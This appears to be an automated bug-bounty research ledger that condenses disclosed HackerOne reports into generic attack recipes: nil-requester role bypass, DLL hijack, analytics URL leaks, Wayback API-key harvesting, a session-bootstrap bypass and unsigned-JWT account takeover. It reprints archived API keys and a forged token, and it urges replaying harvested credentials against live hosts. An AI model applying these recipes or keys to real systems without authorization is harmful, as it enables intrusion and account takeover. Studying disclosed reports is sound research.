family (V-04 + the recorded picker-id entry), the only new bit being that the field is ABSENT from the legitimate request; abdulsec / "How i was able to bypass parental pin of showmax" — the SAME writeup URL already read and recorded as §17.209 (Showmax #1077520). 6 sources read, 0 fabricated. Full per-source route/honesty records are in the harvest ledger `/root/bugbountyhuntingskills.md` and `/root/hackbot-architecture/knowledge/methodologies-2026-11-10.md`.

SOURCE: https://hackerone.com/reports/781175  2026-11-10
ROUTE: `web_extract` on the live HackerOne report page -> HTTP 200, full body read (the `ProtectedChecklist` authorizer source, the `claimed_by_user` scope, the anonymous GraphQL query and the timeline; no fallback route needed).
STATUS: UNVERIFIED (not reproduced — no HackerOne GraphQL endpoint was called this pass; every quote below is verbatim from the report).
CLASS: broken access control / authorization bypass (CWE-863 / CWE-285) — an authorization ROLE is granted by a SCOPE query over a NULLable foreign key, and an unauthenticated (nil) requester satisfies that scope, so anonymous callers inherit a role meant for object claimants.
CORE METHOD:
  1. THE AUTHORIZER, verbatim: `class ProtectedChecklist` / `include ::ProtectedAttribute::Protector` / `model { Checklist }` / `copy_roles(ProtectedTeam) do Checklist.joins(:team) end` / `role(:CLAIMER) { |requester| claimed_by_user(requester) }` — the CLAIMER role is decided by a SCOPE, not by an explicit ownership field.
  2. THE SCOPE, verbatim: `scope :claimed_by_user, lambda { |user| where(id: ChecklistCheck.where(user_id: user).select(:checklist_id)) }` — a SUBQUERY, not an inner join.
  3. THE ROOT CAUSE, verbatim: "Instead of an inner join, a query (`ChecklistCheck.where(user_id: user).select(:checklist_id)`) is used to fetch the checklist IDs that are claimed. Because not all checks are claimed, `user_id` can be set to `NULL` in the database. Because the HackerOne GraphQL endpoint can be queried as an anonymous user, this scope can be called with `nil`. This causes anonymous users to automatically get the `CLAIMER` role, thus exposing information about `Checklist` objects."
  4. THE PROBE, verbatim: `query { node(id: "Z2lkOi8vaGFja2Vyb25lL0NoZWNrbGlzdC8x") { ... on Checklist { name expires_at } } }` — "Make sure you're signed out when executing this query."
  5. THE CEILING, verbatim: "Any relations defined on the `Checklist` model, such as `team`, `checklist_check_responses`, and `checklist_checks` are protected separately and are not accessible by anonymous users. The exposed information is limited to `Checklist` objects, which doesn't expose any customer information." (severity Medium 4.4; HackerOne "has decided that this report is not eligible for a bounty"; resolved; disclosed 2020-03-20.)
DETECTION SIGNAL: a role/permission predicate implemented as a SUBQUERY over a NULLable foreign key (`where(id: Child.where(user_id: requester).select(:parent_id))`, `where(user_id: requester)`, any `requester.nil?`-safe scope); a child/claim/assignment table whose owner column is NULL for unclaimed/orphaned rows; a GraphQL/REST resolver reachable with NO session that still evaluates role scopes. TELL: a signed-out request returns the protected object where an authenticated non-member gets nothing.
CHAIN: any anonymous caller (primitive: the resolver is reachable with no session) -> the role scope runs with `user = nil` (primitive: the requester identity is NULL, not a value that fails) -> the subquery's `user_id: NULL` matches the UNCLAIMED child rows (escalation: the NULL key is a MATCH, not a mismatch, so the requester inherits the CLAIMER role) -> the protected parent object is readable (impact: broken access control / information disclosure — here limited to Checklist `name`/`expires_at`, Medium 4.4, no bounty). Per doctrine §8: preconditions = none (anonymous) plus a resolver that evaluates a NULL-safe role scope; gain = whatever the role's allow-list exposes (here checklist metadata; on another target the same pattern exposes the object's contents or its write actions).
TRANSFERABLE TEST: on ANY target whose authorization is a role/permission predicate over a database scope — (1) obtain the authorizer/scope source, or infer it from the API schema (`role(:X) { |requester| ...scope... }`, `where(user_id: requester)`, `where(id: Child.where(...).select(:parent_id))`); (2) identify every child/claim/assignment/membership table whose owner column is NULLable and holds NULL rows (unclaimed, orphaned, deleted-owner, system rows); (3) call the protected endpoint with NO session (signed out, no cookie/bearer) and request the object the role guards; (4) a 200 with the protected body where an authenticated non-member gets a 403/empty = the NULL key matched the NULL requester and the anonymous caller inherited the role; (5) re-run the same call with a NON-NULL non-owner identity to confirm the difference. Rule: **a role scope over a nullable foreign key is a NULL-equality match — the unauthenticated requester is NULL, the unclaimed rows are NULL, and NULL = NULL grants the role; test every protected resolver signed out.**
DEDUPE: 0 hits across all three write targets for `claimed_by_user`, `ChecklistCheck`, `ProtectedChecklist`, `Protector`, `unclaimed`, `Z2lkOi8vaGFja2Vyb25lL0NoZWNrbGlzdC8x`. Related-but-distinct recorded material REVIEWED and NOT re-recorded: §17.201 (Basecamp/Campfire #3329310 — a SPLIT CREDENTIAL whose empty half parses to `nil` and whose ORM lookup then matches records whose credential COLUMN IS NULL) is the SAME NULL-match principle at the AUTHENTICATION layer, where the attacker must SUPPLY a degenerate credential (`<victim_id>-`); #781175 is the AUTHORIZATION layer, where the attacker supplies NOTHING and the server's own role scope matches the NULL requester — a different layer and a different test (signed-out call vs. crafted credential), so it is recorded here as a DELTA and given NO §17 slot. V-07 (OTP/2FA accepting `code=null`) is a verify-step fail-open, not a scope match. Also reviewed: the GraphQL field-oracle/count-only family (§17.60, #310946, #877642) — a field disclosure, not a role grant.

SOURCE: https://hackerone.com/reports/440963  2026-11-10
ROUTE: `web_extract` on the live HackerOne report page -> HTTP 200, full body read (the Process Monitor observation, the directory tree, the DLL placement and the outcome; no fallback route needed).
STATUS: UNVERIFIED (not reproduced — no Windows host was touched this pass; every quote below is verbatim from the report).
CLASS: local privilege escalation / DLL search-order hijack (CWE-73 / CWE-426) — a privileged application loads a DLL from a directory that does not exist, and every authenticated Windows user may create directories on the drive root, so a low-privileged user plants a DLL that a high-privileged user's process loads.
CORE METHOD:
  1. THE OBSERVATION, verbatim: "Monitoring the BurpSuite application in Process Monitor, we can see that it tries to load 2 DLLs from a directory that does not exist."
  2. THE PERMISSION, verbatim: "The interesting thing here is, that on Windows (verified for 7,10,Server 2008 R2 and Server 2012) every authenticated user is allowed to add new folders on the `C:\` drive. This in turn allows an attacker to create the folder structure and inject arbitrary DLLs to Burpsuite."
  3. THE PATH, verbatim: "When Burpsuite runs, it tries to load some DLLs in the path `C:\Program%20Files`. Because the folder doesn't exists, it can be created by a low-privileged user which can inject arbitrary DLL into the process when another privileged user runs Burpsuite."
  4. THE STEPS, verbatim: "1. Login as a low-privileged user on a system which has Burpsuite installed. 2. Create the directory tree as shown in the image below. 3. Copy the attached `sunec.dll` file to the last directory (amd64). 4. Simulate the login of a privileged user, run Burpsuite and a message should pop up."
  5. THE IMPACT, verbatim: "A low privileged user can execute code as a high privileged user." (closed as Duplicate #257004; PortSwigger: "we decided was out of scope as Burp trusts the system it's running on by design - as stated in our bounty brief, we are only interested in DLL hijacking targeting the installer"; fixed in 2.0.18 by bundling OpenJDK 11.)
DETECTION SIGNAL: a privileged/desktop process whose DLL load path contains a directory that DOES NOT EXIST (Process Monitor filter on the app's image with `Result` = `NAME NOT FOUND` / `PATH NOT FOUND`); a drive-root or Program Files-adjacent path a standard user can create (check with `icacls` / `Get-Acl`); a privileged user who later runs the app. TELL: Process Monitor shows the app PROBING a missing directory for a DLL, and `icacls` shows `BUILTIN\Users:(OI)(CI)(F)` (or `(WD,AD)`) on the parent.
CHAIN: any low-privileged authenticated user on a shared Windows host (primitive: a local account) -> the privileged app probes a DLL path whose directory does not exist (primitive: a missing directory in the app's own search path) -> the user creates the directory tree and drops a DLL with the probed name (escalation: the write lands in the app's own DLL search order) -> a privileged user runs the app and the DLL is loaded (impact: code execution as the high-privileged user — the report's own impact line: "A low privileged user can execute code as a high privileged user"). Per doctrine §8: preconditions = a low-priv account on a host where a privileged user runs the affected app, plus write access to the missing directory's parent; gain = code execution in the privileged user's context.
TRANSFERABLE TEST: on ANY Windows host where a privileged or user-context app is in scope — (1) run Process Monitor filtered on the app's image name and `Operation` = `CreateFile`/`QueryOpen` with `Result` = `NAME NOT FOUND`, and harvest every DLL path the app probes that does not exist; (2) for each missing path, check the parent's ACL (`icacls "<parent>"`) and confirm a standard user can create the directory (`mkdir "<path>"` as that user); (3) build a DLL whose `DllMain`/exported function leaves a marker (`touch C:\pwned`, a callback, or a message box) and copy it to the probed name in the created tree; (4) have a privileged user launch the app (or wait for the scheduled run) and observe the marker. Rule: **a privileged process that probes a DLL path which does not exist is a low-priv-write -> high-priv-code-exec primitive — Process Monitor the app for `NAME NOT FOUND` DLL loads, check whether a standard user can create that directory, and drop the DLL with the probed name.**
DEDUPE: 0 hits across all three write targets for `sunec.dll`, `NAME NOT FOUND`, `Program%20Files`, `missing directory`, `search-order hijack`, `non-existent path`, `icacls`. Related-but-distinct recorded material REVIEWED and NOT re-recorded: §17.343 (Vulnano / Facebook Messenger for Windows — a FILENAME TRAVERSAL writes `..\qwave.dll` into a NEIGHBOURING app's directory) already records the DLL-HIJACK SINK CLASS; #440963's only new content is the ENTRY POINT — the app's OWN missing directory on a world-writable drive root, created by the attacker, rather than a traversal-supplied filename — so it is recorded here as a DELTA and given NO §17 slot. Also reviewed: the Burp-crawler `accept`-value arbitrary-write entry (~ledger line 3704) — a browser-crawler file write to a user-writable path, not a DLL search-order hijack; and the Keybase setuid/`$PATH` entries (§17.86, §17.182) — a setuid binary resolving a helper by bare name, not a missing DLL directory.

SOURCE: https://hackerone.com/reports/269479  2026-11-10
ROUTE: `web_extract` on the live HackerOne report page -> HTTP 200, full body read (the two `POST /r/collect` request captures, the summary, the scenario and the timeline; no fallback route needed).
STATUS: UNVERIFIED (not reproduced — no HackerOne page was clicked this pass; every quote below is verbatim from the report).
CLASS: sensitive information disclosure via a third-party analytics beacon (CWE-200 / CWE-598) — the page's own analytics/click-tracking beacon transmits the current page URL (and the clicked link) in its query string/body to a third-party domain, so any URL-bound secret (a private report id, a token, a magic-link parameter) is disclosed to that third party.
CORE METHOD:
  1. THE OBSERVATION, verbatim: "when the report contents have a link URLs and any participants clicks the link, the link was being leaked to external domain which is Google Analytics."
  2. THE PROBE, verbatim: "1. Click any url/link on the private report and capture the request using burp. 2. Observe that there is a `POST` that leaks the private link to google analytics before after redirecting to the external link warning page."
  3. THE WIRE FORMAT, verbatim: `POST /r/collect HTTP/1.1` / `Host: www.google-analytics.com` / `User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:55.0) Gecko/20100101 Firefox/55.0` / `Accept: */*` / `Accept-Language: en-US,en;q=0.5` / `Content-Type: text/plain` / `Referer: https://hackerone.com/` / `Content-Length: 428` / `Origin: https://hackerone.com` / `DNT: 1` / `Connection: close` — the beacon fires on the PRIVATE page, with the private page as `Referer`/`Origin`, and the private URL rides in the POST body/query string to a third-party host.
  4. THE IMPACT, verbatim: "Most of the researcher provides a link/url as a PoC pointing to some video reproduction steps, that link is private only for the sec team to reproduce the issue, but security teams didn't know that the link provided by the researcher already leak upon clicking the link. Please note that most of the link for PoC video contains sensitive information such steps to reproduce the bug." (severity Medium 4 ~ 6.9; resolved; disclosed 2017-10-25.)
DETECTION SIGNAL: a page that loads a third-party analytics/tag/beacon script (GA, GTM, Mixpanel, Segment, Hotjar, a tracker CDN) AND whose URLs carry sensitive state (private ids, tokens, magic-link parameters, invite codes); a click-tracking redirector/interstitial that navigates through an outbound-link warning page; a beacon request whose `dl`/`u`/`url`/`page`/`referrer`/`payload` parameter or POST body contains the full current URL. TELL: a proxy capture of a click on a sensitive page shows a request to a third-party domain carrying the sensitive URL in its query string or body.
CHAIN: any viewer of a private/sensitive page (primitive: a participant with access) -> the page's third-party analytics/click-tracking beacon fires on the private URL and carries it in the query string (primitive: the URL is a tracking parameter) -> the beacon is sent to a third-party host with the private page as `Referer`/`Origin` (escalation: the sensitive URL leaves the trusted origin for a third party) -> every URL-bound secret on that page (private report id, invite/token parameter, PoC link) is disclosed to the third party and its logs/partners (impact: sensitive information disclosure WITH PoC — the report's own impact is the leak of private PoC links containing reproduction steps). Per doctrine §8: preconditions = a viewer of the private page and a click on any link (or a page load, if the beacon fires on load); gain = the private URL and every secret it carries, delivered to a third-party analytics provider.
TRANSFERABLE TEST: on ANY target whose URLs carry tokens/private ids — (1) load the sensitive page with a proxy and click every link, and also just load the page; (2) capture every request to a third-party analytics/tracking host (GA `/r/collect` or `/collect`, GTM, Mixpanel, Segment, Hotjar, a tracker CDN); (3) grep the request URL and POST body for the full current page URL, the clicked URL, or any token/parameter from the page; (4) a hit proves the URL is transmitted off-origin; then (5) check whether the leaked value is itself a credential (an invite token, a magic-link token, a reset token) — if so, replay it, because the leak is then an account-takeover chain, not just a disclosure. Rule: **a third-party analytics beacon on a page whose URL carries a secret is a disclosure channel — proxy a click, grep the beacon's query string and POST body for the page URL, and treat any token found there as stolen.**
DEDUPE: 0 hits across all three write targets for `r/collect`, `/r/collect`, `www.google-analytics.com` AS A BEACON SINK, `private_link_leaked`, `leaks the private link`, `analytics beacon` AS A URL-EXFILTRATION CHANNEL. Related-but-distinct recorded material REVIEWED and NOT re-recorded: the ledger's OAuth entry at ~line 6223/6226 (an attacker's OWN Google Analytics real-time report captures an authorization `code` from the query string when the victim is redirected to the attacker's page) is the REVERSE direction — the attacker owns the analytics property and the victim's browser is sent there; #269479 is the TARGET's own beacon transmitting the target's private URL to a third party. The Shopify `GoogleAnalyticsAdditionalScripts` postMessage entry (ledger ~line 8683) is an XSS/cookie sink, not a URL disclosure. The first-party-param -> third-party JSONP entry (§17.388) is a script-source selection, not a beacon carrying the page URL. Also reviewed: the recorded Referer-leak material (~ledger lines 2289, 4618) — a token in the URL landing in the `Referer` header of a THIRD-PARTY resource the page loads; #269479 is the site's own analytics POST carrying the URL in its body/query string, not a `Referer` header. New general method -> §17.425.

NOTE — §17 additions 2026-11-10 batch 135 (§17.425 appended from the 6 assigned sources read ONE BY ONE in the given order; 3 entries appended to the harvest ledger + 1 §17 slot). NEW: (1) HackerOne #781175 — an authorization ROLE is granted by a SCOPE query over a NULLable foreign key (`ChecklistCheck.where(user_id: user)`), and because unclaimed rows have `user_id = NULL`, an ANONYMOUS (nil) requester satisfies the scope and inherits the CLAIMER role -> protected Checklist objects readable signed out (Medium 4.4, no bounty) — recorded as a DELTA of §17.201's NULL-match principle (different layer: authZ role grant vs. authN credential; no §17 slot). (2) PortSwigger #440963 — a privileged Windows app probes a DLL path (`C:\Program%20Files\...`) whose directory does NOT exist; any authenticated user can create directories on `C:\`, so a low-priv user creates the tree and drops `sunec.dll` (amd64) -> code execution when a privileged user runs the app — recorded as a DELTA of §17.343's DLL-hijack family (new entry point: the app's OWN missing directory vs. a traversal-supplied filename; no §17 slot). (3) HackerOne #269479 — the page's OWN third-party analytics beacon (`POST www.google-analytics.com/r/collect`) carries the private page URL in its query string/body to a third party on every link click -> private report/PoC links disclosed — new general method -> §17.425. VALID-BUT-DUPLICATE (read, nothing new, no entry): HackerOne #765679 (Palo Alto Software, "Stored XSS on upload files leads to steal cookie") — an SVG renamed to `.png`/`.bmp`/`.gif` is accepted by an extension-only upload check and executes `onload` when the victim opens the attachment in a new tab; the ledger's §1.4 already records the SVG-upload/content-sniffing family ("SVG is a document, `<script>` executes on direct navigation"; "the bug is almost always served-content-type sniffing ... without `X-Content-Type-Options: nosniff`"; "`.html` smuggled past extension checks") and the Shopify `data:image/svg+xml` entry plus the Safari `<use href="test.png#x">` entry already cover the "open the asset as a top-level document / import an image as SVG" trigger — the only delta is the chat-attachment delivery (victim clicks the file in the conversation UI), a held lead, not a new method. HackerOne #380317 ("Team object exposes amount of participants in a private program to non-invited users") — `query { team(handle: "...") { participants { total_count } about } }` returns `{"team":{"participants":{"total_count":268},"about":"..."}}`; this is the COUNT-ONLY GraphQL field oracle already recorded at §17.60 / #310946 / #877642, and the ledger explicitly folds the count-only variant as "a COUNT-only disclosure with no impact — a P4 primitive on its own"; the "a schema update silently added the field" angle is a held recon lead (diff the public GraphQL schema across versions), not an entry. INVALID FOR TECHNIQUE (real and readable, no concrete method, below the bar): HackerOne #744692 (Bumble / HotOrNot, "The login of Hotor Not is Vulnerable to bruteforce") — the body is "Use Burp intruder attack for BruteForcing / Send as many requests you want" plus a request for rate limiting; a missing rate limit is doctrine §2(c) ineligible and the report teaches no bypass, no request shape and no chain. 6 sources read, 0 fabricated. Full per-source route/honesty records are in the harvest ledger `/root/bugbountyhuntingskills.md` and `/root/hackbot-architecture/knowledge/methodologies-2026-11-10.md`.

SOURCE: https://hackerone.com/reports/1639011  2026-11-10
ROUTE: `web_extract` on the live HackerOne report page -> HTTP 200, full body read (the Planet Labs program summary, the two archived-URL PoCs, the validity control, the timeline and the severity; no fallback route needed).
STATUS: UNVERIFIED (not reproduced — no Planet Labs API key was replayed this pass; every quote below is verbatim from the report).
CLASS: sensitive information disclosure / credential exposure — API keys for the target's OWN API are archived in the Wayback Machine's historical snapshots of the API endpoints, and the archived keys are still valid (CWE-200 / CWE-598). Chain-only material recorded as required (doctrine §2(b)): the archive copy is the first link, the live key is the impact.
CORE METHOD:
  1. THE DISCOVERY, verbatim: "A security vulnerability has been identified where sensitive API keys are exposed through archived data accessible via the Wayback Machine (web.archive.org). Some of these API keys are found to be valid and could potentially be exploited by malicious actors. The exposure occurs through historical snapshots of Planet's API endpoints that were cached by the Internet Archive's crawling service."
  2. THE HUNT, verbatim: "https://web.archive.org/web/*/https://api.planet.com/*" — enumerate the Wayback snapshots of the target's API host.
  3. THE POC, verbatim: "check this url https://api.planet.com/basemaps/v1/mosaics?api_key=afdb1e8a9c8142739553e3942283d6c8&_page_size=1000 and this https://api.planet.com/basemaps/v1/mosaics/wmts?service=wmts&request=GetCapabilities&format=text%2Fxml&api_key=8fe044edc78c46ba904bb62e550493a3" — the `api_key` rides in the QUERY STRING of the archived API URL.
  4. THE CONTROL, verbatim: "can see vaild api kay" / "this not vaild https://api.planet.com/basemaps/v1/mosaics?api_key=f366791cb438466fb9e3e492e721da8d&_page_size=1000" — not every archived key is live; each one must be replayed to find out.
  5. THE IMPACT, verbatim: "It can be used to offend" (the report's own words; the program rated it Medium 4 ~ 6.9).
DETECTION SIGNAL: a target whose API or web app puts a credential in the URL query string (`api_key=`, `token=`, `key=`, `access_token=`, `sig=`, `signature=`, `pwd=`, `secret=`) at any point in its history; the Wayback CDX index lists snapshots of the API host; the archived URLs are retrievable and the keys replayable. TELL: the CDX returns archived API URLs whose query strings carry a key, and the key still authenticates against the live host.
CHAIN: the target's own API endpoint is crawled and archived WITH the credential in the query string (primitive: a secret in a URL — doctrine §2(b) alone) -> the Wayback Machine keeps a permanent copy the target does not control (primitive: a third-party, indefinite secret store) -> the attacker harvests the key from the archive (escalation: credential disclosure WITH PoC) -> the key is replayed against the live API (escalation: the archived credential still authenticates) -> access to the API and its data/usage at that key's privilege (impact: sensitive info disclosure / unauthorized API access; the program rated it Medium). Per doctrine §8: preconditions = the target ever put a credential in a URL that a crawler archived, and the key is still valid; gain = a live API credential and whatever the API exposes at that key's scope.
TRANSFERABLE TEST: on ANY target — (1) query the Wayback CDX API for the target's API/web hosts: `curl "http://web.archive.org/cdx/search/cdx?url=api.<target>/*&output=text&fl=original,timestamp,statuscode&collapse=urlkey"` (also `*.<target>/*` and the bare host); (2) grep the returned `original` URLs for credential-bearing query keys (`api_key`, `apikey`, `key`, `token`, `access_token`, `auth`, `sig`, `signature`, `password`, `pwd`, `secret`); (3) for every hit, replay the EXACT archived URL (or just the key) against the live host and check whether it authenticates / returns data; (4) a 200 with data = a live archived credential; (5) also grep the target's own JS/headers/logs for the same keys and get them rotated. Rule: **a credential in a URL is a credential in the web archive — enumerate the Wayback CDX for the target's hosts, grep the archived URLs for key/token parameters, and replay each one; the archive is a permanent, target-uncontrolled secret store.**
DEDUPE: 0 hits across all three write targets for `api.planet.com`, `basemaps`, `mosaics`, `afdb1e8a9c8142739553e3942283d6c8`, `8fe044edc78c46ba904bb62e550493a3`, `y0usef`, and the Wayback CDX AS A CREDENTIAL-HARVEST CHANNEL. Related-but-distinct recorded material REVIEWED and NOT re-recorded: the ledger's tooling note (~line 1885) lists `gau`/`waybackurls`/the Wayback CDX API "for historical endpoints and backup files" — a tool inventory, not a secret-harvest technique; the recorded Referer-leak material (~lines 2289/4618) is a token landing in the `Referer` header of a third-party subresource, not a key archived in the target's own API URL; §17.388 is a first-party parameter selecting a third-party JSONP script source. New general method -> §17.426.

SOURCE: https://hackerone.com/reports/2414707  2026-11-10
ROUTE: `web_extract` on the live HackerOne report page -> HTTP 200, full body read (the redacted report text, the two PoC steps, the impact and the suggested mitigation; no fallback route needed).
STATUS: UNVERIFIED (not reproduced — no DoD endpoint was touched this pass; every quote below is verbatim from the report).
CLASS: authentication bypass — a standalone SESSION-BOOTSTRAP endpoint is reachable with no session and, simply by being visited, creates a valid session and redirects the caller into the authenticated application (CWE-287 / CWE-306).
CORE METHOD:
  1. THE OBSERVATION, verbatim: "An authentication bypass vulnerability exists on https://████████/ which allows access to the site. When visiting /███████/GxSessionIfc.php, this creates a valid session for the user and allows them to bypass the ████████ authentication requirement."
  2. THE BASELINE, verbatim: "1. Visit https://██████/dncp/home.php, and see that you are automatically redirected to https://████████/dncp/█████.php, the authentication page."
  3. THE BYPASS, verbatim: "2. Visit https://██████████/████████/GxSessionIfc.php, which redirects to https://████████/████████/GxAccessTokenIfc.php, and subsequently https://██████████/dncp/home.php with a valid session."
  4. THE MITIGATION, verbatim: "Enforce access controls on the endpoints that set valid sessions to unauthenticated users."
DETECTION SIGNAL: an endpoint whose NAME is a session/auth noun (`*Session*`, `*SessionIfc*`, `*AccessToken*`, `*Auth*`, `*Login*`, `*SSO*`, `*Token*`) that answers a plain GET with a 3xx into the app's authenticated area and/or sets a session cookie, while the app's own login page 302s unauthenticated visitors to the login screen; a redirect chain that passes through a session-issuing script before landing on a protected page. TELL: visiting the session endpoint with NO cookies yields a session cookie, or a 200 on a page that normally redirects to login.
CHAIN: any unauthenticated caller (primitive: can reach the session-bootstrap endpoint) -> the endpoint creates a valid session for the caller (primitive: a session-issuing route with no authentication gate) -> the caller is redirected into the authenticated application (escalation: authentication bypass) -> the attacker is inside the app as an authenticated user (impact: unauthorized access to the site; the report's own impact: "An unauthorized user, such as an attacker, would be able to gain unauthorized access to this site. This is a breach of confidentiality."). Per doctrine §8: preconditions = reachability of the session-bootstrap endpoint with no session; gain = a valid session and access to the authenticated application.
TRANSFERABLE TEST: on ANY target — (1) enumerate every route whose name is a session/auth noun (`*Session*`, `*SessionIfc*`, `*AccessToken*`, `*Auth*`, `*Login*`, `*SSO*`, `*Token*`, `*GxSession*`) from the JS bundles, the sitemap, the proxy history and a wordlist; (2) request each with NO cookies and follow redirects, capturing every `Set-Cookie` and every 3xx `Location`; (3) a session cookie set, or a 3xx chain that lands on a page which normally 302s to the login screen, is the bypass; (4) re-request the protected page with the harvested cookie and confirm a 200. Rule: **a session-issuing endpoint must authenticate the caller BEFORE it issues the session — enumerate the `*Session*`/`*AccessToken*` routes, hit them signed out, and look for a cookie or a redirect into the authenticated area.**
DEDUPE: 0 hits across all three write targets for `GxSessionIfc`, `GxAccessTokenIfc`, `SessionIfc`, `session bootstrap`, `session-issuing endpoint`, `creates a valid session`. Related-but-distinct recorded material REVIEWED and NOT re-recorded: §17.126 (Mapbox #294911) is the OAUTH-FAILURE variant — a session minted on the FAILURE branch of an OAuth exchange; #2414707 has NO OAuth flow at all, just a standalone session-bootstrap script, so it is recorded here as a DELTA (new entry point, same "a session minted without a completed authentication" family) and given NO §17 slot. Also reviewed: §17.219 (the Flask signed-cookie secret-reuse entry) and the cookie-prefix session-fixation entry (~line 7447) — both are cookie-forgery/fixation sinks, not an unauthenticated session-issuing route.

SOURCE: https://hackerone.com/reports/2536758  2026-11-10
ROUTE: `web_extract` on the live HackerOne report page -> HTTP 200, full body read (the summary, the requirements, the reproduction JS, the supporting reference and the notes; no fallback route needed).
STATUS: UNVERIFIED (not reproduced — no WordPress/Newspack endpoint was called this pass; every quote below is verbatim from the report).
CLASS: authentication bypass / account takeover — a JWT-based registration+login endpoint does not verify the token's signature, so an attacker mints a token carrying the victim's email and is authenticated as that user (CWE-347 / CWE-287).
CORE METHOD:
  1. THE ROOT CAUSE, verbatim: "The Newspack Extended Access plugin omits to verify JWT signing on the registration and login JSON endpoint. This permits registration of accounts with arbitrary (user-supplied) details, and auth bypass and account hijack if a target account email is known."
  2. THE CLIENT ID TO HARVEST, verbatim: "Obtain the target site's Google App ID (ex: 12345-abcdef.apps.googleusercontent.com) by visiting the site and copying the JS value `authenticationSettings.googleClientApiID`" — the `azp` claim must be the site's own OAuth client id.
  3. THE IDENTITY CLAIM, verbatim: "Obtain the target email of the desired account (ex: test@example.org) to either hijack (existing) or register as a new user verified as associated with the named Google account."
  4. THE TOKEN, verbatim: "Create an unsigned JWT containing payload value `{\"azp\": {app id}, \"email\": \"target@example.org\"}`." — the report's own example token is `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiYXpwIjoiMTIzNDUtYWJjZGVmLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwiZW1haWwiOiJ0ZXN0QGV4YW1wbGUub3JnIn0.Nq7Nc2AyWe17gPmIHVRCc4z9qKP-HBZwfWhyQ_dg9X0`.
  5. THE TRANSPORT, verbatim: the endpoint is `${window.location.protocol}//${window.location.hostname}/wp-json/newspack-extended-access/v1/google/register` and the token is POSTed as a `Content-Type: text/plain` BODY — `fetch(url, {cache: 'no-store', method: 'POST', headers: {'Content-type': 'text/plain'}, body: token})`.
  6. THE OUTCOME, verbatim: "The browser will now be logged into the target account." / "Browser will be authenticated as the target user."
  7. THE MITIGATION THAT WAS REMOVED, verbatim: "There was previously a mitigation that hijack of Administrator or Editor roles was prevented, this was recently removed in automattic/newspack-extended-access@4c87c25a".
DETECTION SIGNAL: a login/registration endpoint that accepts a JWT in the request BODY (not an `Authorization: Bearer` header) — especially a `text/plain` body; a `wp-json/<plugin>/v1/<provider>/register` route; a claim set that carries the identity (`email`, `sub`) and the OAuth client (`azp`, `aud`, `iss`) with no signature check; a client-id value (`authenticationSettings.googleClientApiID`) exposed in the site's own JS. TELL: a self-minted token with the victim's email and the site's client id returns a session/200 instead of 401.
CHAIN: any unauthenticated attacker (primitive: can reach the registration endpoint) -> the attacker mints a JWT with the victim's `email` and the site's `azp` and no/invalid signature (primitive: the endpoint trusts the claims) -> the endpoint authenticates the caller as the victim (escalation: authentication bypass -> account takeover) -> the attacker is logged in as the target account (impact: account hijack; the report's own words: "auth bypass and account hijack if a target account email is known"). Per doctrine §8: preconditions = the target site's OAuth client id (public, in its JS) and the victim's email address; gain = a session as the victim (and, per the report, the role restriction that used to block Administrator/Editor hijack was removed).
TRANSFERABLE TEST: on ANY JWT-based login/registration endpoint — (1) find the endpoint and the claim set it trusts (`email`, `sub`, `azp`, `aud`, `iss`) from the JS bundle or the API schema; (2) harvest the site's own OAuth client id from its JS (`authenticationSettings.googleClientApiID`, `clientId`, `appId`); (3) mint a token with the victim's email and the site's client id, with NO signature (or `alg:none`, or a random signature); (4) POST it to the endpoint in EVERY transport the endpoint accepts — `Authorization: Bearer`, a `text/plain` body, a JSON `{"token": ...}` body, a query parameter; (5) a 200/session/redirect into the account = the signature is not verified. Rule: **a JWT login/registration endpoint must verify the signature BEFORE it trusts the identity claim — mint a token with the victim's email and the site's own client id, send it with no signature in every transport, and look for a session.**
DEDUPE: 0 hits across all three write targets for `newspack`, `newspack-extended-access`, `google/register`, `authenticationSettings`, `googleClientApiID`, `azp`, `4c87c25a`. Related-but-distinct recorded material REVIEWED and NOT re-recorded: the ledger's §11.2 item 2 ("Missing signature validation — remove the signature segment entirely and send `header.payload.`") is the SAME root cause at the generic level — #2536758 is recorded here as a DELTA for its ENTRY POINT (a user-facing WP REST registration/login endpoint that takes the JWT as a `text/plain` body and trusts the `email` claim) and given NO §17 slot; §17.8 (JFrog Artifactory #3994056) already records the "forged JWT as a `Content-Type: text/plain` body to a `/registry/join` endpoint" TRANSPORT, but its root cause is a DEFAULT/EMPTY signing key (the signature IS verified), not a missing verification — a different root cause and a different test (guess the key vs. send no signature). Also reviewed: the ledger's alg:none / RS256->HS256 confusion material (§11.2 items 1 and 5) — an algorithm trick, not a missing check.

NOTE — §17 additions 2026-11-10 batch 136 (§17.426 appended from the 6 assigned sources read ONE BY ONE in the given order; 3 entries appended to the harvest ledger + 1 §17 slot). NEW: (1) HackerOne #1639011 (Planet Labs, "Api data leak", reporter y0usef, Medium 4 ~ 6.9, disclosed 2024-11-20) — the target's own API keys ride in the QUERY STRING of URLs that the Wayback Machine archived, and the archived keys are still valid: enumerate the Wayback CDX for the target's API host, grep the archived URLs for `api_key=`/`token=`/`key=`, replay each one -> new general method -> §17.426. (2) HackerOne #2414707 (U.S. Dept Of Defense, "Authentication Bypass", reporter bulldawg, 2024-03-13) — a standalone SESSION-BOOTSTRAP endpoint (`/███████/GxSessionIfc.php`) is reachable with NO session and, simply by being visited, creates a valid session and redirects through `GxAccessTokenIfc.php` into the authenticated app -> DELTA of §17.126's "a session minted without a completed authentication" family (new entry point: no OAuth flow at all; no §17 slot). (3) HackerOne #2536758 (Automattic, "Authentication & Registration Bypass in Newspack Extended Access", reporter xurizaemon0, 2024-06-05) — a WP REST registration/login endpoint (`/wp-json/newspack-extended-access/v1/google/register`) does not verify the JWT signature, so an unsigned token with the victim's `email` and the site's own `azp` (harvestable from the JS value `authenticationSettings.googleClientApiID`) is POSTed as a `text/plain` body and authenticates the caller as the victim -> DELTA of §11.2 item 2's "missing signature validation" (new entry point: a user-facing registration/login endpoint; the `text/plain`-body transport is §17.8's, but §17.8's root cause is a default key, not a missing check; no §17 slot). VALID-BUT-DUPLICATE (read, nothing new, no entry): HackerOne #1820953 (Shopify, "Non-store owners can transfer Shopify-managed domain to another domain provider", reporter boy_child_, Medium 5.4, disclosed 2024-01-17) — staff WITHOUT the "Transfer domain to another Shopify store" permission could transfer the shop's domain to another provider; this is the function-level-route BFLA already recorded as V-06 ("a different endpoint entirely") and the sibling of §17.423's per-endpoint-permission family, and the report body is screenshots plus a one-paragraph 